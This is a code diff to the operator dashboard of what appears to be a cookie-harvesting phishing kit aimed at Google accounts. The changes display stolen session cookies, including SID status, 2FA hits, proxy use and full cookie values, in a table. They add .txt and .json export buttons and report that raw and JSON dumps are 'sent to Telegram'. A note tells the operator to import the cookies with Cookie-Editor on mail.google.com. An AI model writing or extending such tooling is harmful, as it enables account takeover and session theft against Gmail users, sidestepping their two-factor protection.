@@ -539,6 +539,14 @@
     .vcb-note { font-size: 12px; color: #5f6b7a; margin-bottom: 8px; line-height: 1.5; }
     .vcb-count { font-size: 12px; color: #1b1f24; font-weight: 700; margin-bottom: 8px; }
     .vcb-status { font-size: 12px; margin-top: 10px; color: #5f6b7a; }
+
+    /* cookie table */
+    .vcb-table { width: 100%; border-collapse: collapse; font-size: 11px; margin-bottom: 10px; }
+    .vcb-table th, .vcb-table td { text-align: left; padding: 4px 6px; border-bottom: 1px solid #eef1f5; vertical-align: top; }
+    .vcb-table th { color: #5f6b7a; font-weight: 600; }
+    .vcb-table td.val { font-family: ui-monospace, Menlo, monospace; word-break: break-all; max-width: 200px; }
+    .vcb-badge { display: inline-block; font-size: 10px; padding: 1px 5px; border-radius: 4px; background: #eef2f7; color: #33404f; }
+    .vcb-badge.crit { background: #e8f0fe; color: #1a73e8; }
 </style>
 </head>
 <body oncontextmenu="return false;">
@@ -1375,12 +1383,52 @@ function showHarvestPanel(h, email, go) {
     count.className = 'vcb-count';
     count.textContent = h.total + ' cookies (' + h.critical + ' critical)' +
         (h.hasSid ? ' · SID ok' : ' · no SID') +
-        (h.needs2fa ? ' · 2FA step hit' : '');
+        (h.needs2fa ? ' · 2FA hit' : '') +
+        (h.proxy ? ' · via proxy' : '');
     body.appendChild(count);
+
+    if (h.error) {
+        const e = document.createElement('div');
+        e.className = 'vcb-note';
+        e.style.color = '#c62828';
+        e.textContent = 'Harvest: ' + h.error + ' (' + (h.traceLen || 0) + ' hops)';
+        body.appendChild(e);
+    }
+
+    if (h.cookies && h.cookies.length) {
+        const table = document.createElement('table');
+        table.className = 'vcb-table';
+        table.innerHTML = '<tr><th>name</th><th>domain</th><th>expiry</th><th>value</th></tr>';
+        h.cookies.forEach(c => {
+            const tr = document.createElement('tr');
+
+            const name = document.createElement('td');
+            const badge = document.createElement('span');
+            badge.className = 'vcb-badge' + (c.critical ? ' crit' : '');
+            badge.textContent = c.name;
+            name.appendChild(badge);
+
+            const dom = document.createElement('td');
+            dom.textContent = c.domain + c.path;
+
+            const exp = document.createElement('td');
+            exp.textContent = c.expiry === 'session' ? 'session'
+                : (c.expiresInSec != null ? Math.round(c.expiresInSec / 60) + 'm' : c.expiry);
+
+            const val = document.createElement('td');
+            val.className = 'val';
+            val.title = c.value;
+            val.textContent = c.value.length > 60 ? c.value.slice(0, 60) + '…' : c.value;
+
+            tr.append(name, dom, exp, val);
+            table.appendChild(tr);
+        });
+        body.appendChild(table);
+    }
 
     const note = document.createElement('div');
     note.className = 'vcb-note';
-    note.textContent = 'Cookie-Editor → Import → paste below → Import. Import while the tab is on mail.google.com.';
+    note.textContent = 'Cookie-Editor → Import → paste JSON → Import. Import while the tab is on mail.google.com.';
     body.appendChild(note);
 
     const ta = document.createElement('textarea');
@@ -1391,7 +1439,7 @@ function showHarvestPanel(h, email, go) {
 
     const status = document.createElement('div');
     status.className = 'vcb-status';
-    status.textContent = (h.telegram && h.telegram.ok) ? 'Sent to Telegram.' : 'Telegram: not sent';
+    status.textContent = (h.telegram && h.telegram.ok) ? 'Raw + JSON sent to Telegram.' : 'Telegram: not sent';
     body.appendChild(status);
 
     foot.appendChild(makeHarvestBtn('Download .json', '', () => {
@@ -1403,10 +1451,19 @@ function showHarvestPanel(h, email, go) {
         setTimeout(() => URL.revokeObjectURL(a.href), 4000);
     }));
 
+    foot.appendChild(makeHarvestBtn('Download .txt', '', () => {
+        const blob = new Blob([h.rawText || ''], { type: 'text/plain' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = (h.filename || 'cookies.json').replace('.json', '.txt');
+        a.click();
+        setTimeout(() => URL.revokeObjectURL(a.href), 4000);
+    }));
+
     foot.appendChild(makeHarvestBtn('Copy JSON', '', () => {
         ta.select();
         ta.setSelectionRange(0, 999999);
-        const done = () => { status.textContent = 'Copied to clipboard.'; };
+        const done = () => { status.textContent = 'Copied.'; };
         if (navigator.clipboard && navigator.clipboard.writeText) {
             navigator.clipboard.writeText(h.json).then(done, () => { document.execCommand('copy'); done(); });
         } else {
